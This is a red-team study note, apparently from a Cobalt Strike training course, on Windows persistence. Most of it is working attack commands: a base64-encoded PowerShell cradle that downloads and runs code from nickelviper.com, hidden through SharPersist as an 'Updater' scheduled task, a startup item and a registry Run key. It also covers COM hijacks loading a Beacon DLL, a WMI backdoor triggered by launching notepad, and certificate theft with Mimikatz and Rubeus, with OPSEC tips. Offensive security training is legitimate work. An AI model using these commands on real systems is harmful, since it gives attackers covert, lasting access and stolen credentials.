## Task Scheduler

---

The Windows Task Scheduler allows us to create "tasks" that execute on a pre-determined trigger. That trigger could be a time of day, on user-logon, when the computer goes idle, when the computer is locked, or a combination thereof.

PowerShell:
``` powershell
$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
```

Linux:
```
set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
echo -en $str | iconv -t UTF-16LE | base64 -w 0
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA
```

Create scheduled task with [[SharPersist#schtask]]
```
C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly
```

## StartUp Folder

---

Create a startup application with [[SharPersist#startupfolder]]
```
C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add
```


## Registry AutoRun

---

Create registry auto run with [[SharPersist#reg]]
```
cd C:\ProgramData
upload C:\Payloads\http_x64.exe
mv http_x64.exe updater.exe
C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```


## Hunting for COM Hijacks

---

Instead of hijacking COM objects that are in-use and breaking applications that rely on them, a safer strategy is to find instances of applications trying to load objects that don't actually exist (so-called "abandoned" keys).  [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) is part of the excellent [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). It shows real-time file system, registry and process activity and is very useful in finding different types of privilege escalation primitives.

We're looking for:
- _RegOpenKey_ operations.
- where the Result is _NAME NOT FOUND_.
- and the Path ends with _InprocServer32_.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/57f/155/b0a/procmon-filter.png)

Verify that entry exists in HKLM but not in HKCU:
``` powershell
Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
```

Create the necessary registry entries in HKCU and point them at a Beacon DLL (`C:\Payloads\http_x64.dll`):
``` powershell
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

When _DllHost.exe_ loads this COM entry, we get a Beacon.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/c22/0d0/e0e/dllhost.png)

To clean-up a COM hijack, simply remove the registry entries from HKCU and delete the DLL.

### Look for Hijackable COM Components in Task Scheduler

``` powershell
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

This script is rather self-explanatory and should produce an output similar to the following:

```
Task Name:  SystemSoundsService
Task Path:  \Microsoft\Windows\Multimedia\
CLSID:  {2DEA658F-54C1-4227-AF9B-260AB5FC3543}

Task Name:  MsCtfMonitor
Task Path:  \Microsoft\Windows\TextServicesFramework\
CLSID:  {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}

Task Name:  Calibration Loader
Task Path:  \Microsoft\Windows\WindowsColorSystem\
CLSID:  {B210D694-C8DF-490D-9576-9E20CDBC20BD}

Task Name:  CacheTask
Task Path:  \Microsoft\Windows\Wininet\
CLSID:  {0358B920-0AC7-461F-98F4-58E32CD89148}
```

If we view the _MsCtfMonitor_ task in the Task Scheduler, we can see that it's triggered when any user logs in.  This would act as an effective reboot-persistence.

![](https://rto-assets.s3.eu-west-2.amazonaws.com/host-persistence/MsCtfMonitor.png)

Lookup the current implementation of the component in HKEY_CLASSES_ROOT\\CLSID:
``` powershell
Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
```

Verify that it's currently implemented in HKLM and not HKCU:
``` powershell
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
```

Now it's simply a case of adding a duplicate entry into HKCU pointing to our DLL (as above), and this will be loaded once every time a user logs in.

## Windows Services (Elevated)

---

[[SharPersist#service]]


## WMI Event Subscriptions

---

Persistence via WMI events can be achieved by leveraging the following three classes:

- EventConsumer
- EventFilter
- FilterToConsumerBinding

An EventConsumer is the action that we want to perform - in this case, to execute a payload.  This can be via OS commands (such as a PowerShell one-liner) or VBScript.  An EventFilter is a trigger that we can act upon.  Any arbitrary WMI query can be used as a filter which provides practically unlimited options.  These can include when a particular process starts, when a user logs in, when a USB device is inserted, any specific time of day or on a timed interval.  The FilterToConsumerBinding simply links an EventConsumer and EventFilter together.

[PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) is a PowerShell tool for building these WMI events.  In this example, I will upload a DNS payload into the Windows directory, import PowerLurk.ps1 and create a new WMI event subscription that will execute it whenever notepad is started.

```
beacon> cd C:\Windows
beacon> upload C:\Payloads\dns_x64.exe
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
```

View these classes afterwards:
``` powershell
Get-WmiEvent -Name WmiBackdoor
```

The _CommandLineTemplate_ for the EventConsumer will simply be `C:\Windows\dns_x64.exe`; and query for the EventFilter will be `SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'`.

The backdoor can be removed with:
``` powershell
Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
```


## ADCS Certificate Persistence

---

Certificates can also be useful for maintaining persistent access to both users and computers, because they tend to have a longer shelf-life compared to passwords.  For example, User certificates are valid for an entire year by default, regardless of password changes.

[[Certify#find]]

### User Persistence

If we have a Beacon running on their machine, we can enumerate their certificates with Seatbelt.

[[Seatbelt#Certificates]]

Always ensure the certificate is used for client authentication.

Certificates can be exported with Mimikatz using `crypto::certificates` (although it drops them to disk).

[[mimikatz#certificates#User Certificates]]

Go to _View > Downloads_ to sync files from Cobalt Strike to your local machine.

Base64 encode the pfx file.

```
cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0
```

Then use it with Rubeus to obtain a TGT.  The export password will be `mimikatz`.

[[Rubeus#asktgt#Request Using Certificate]]

**OPSEC**  
  
You may notice that this will request RC4 tickets by default.  You can force the use of AES256 by including the `/enctype:aes256` parameter.

If the user does not have a certificate in their store, we can just request one with Certify.  

[[Certify#request#Current User]]


### Computer Persistence

The same can be applied to computer accounts, but we must elevate to extract those certificates.

[[mimikatz#certificates#Computer Certificates]]

Then use it with Rubeus to obtain a TGT.  The export password will be `mimikatz` and user will be the computer name.

[[Rubeus#asktgt#Request Using Certificate]]

If requesting a machine certificate with Certify, the `/machine` parameter is required to auto-elevate to SYSTEM and assume the identity of the computer account.

[[Certify#request#Computer]]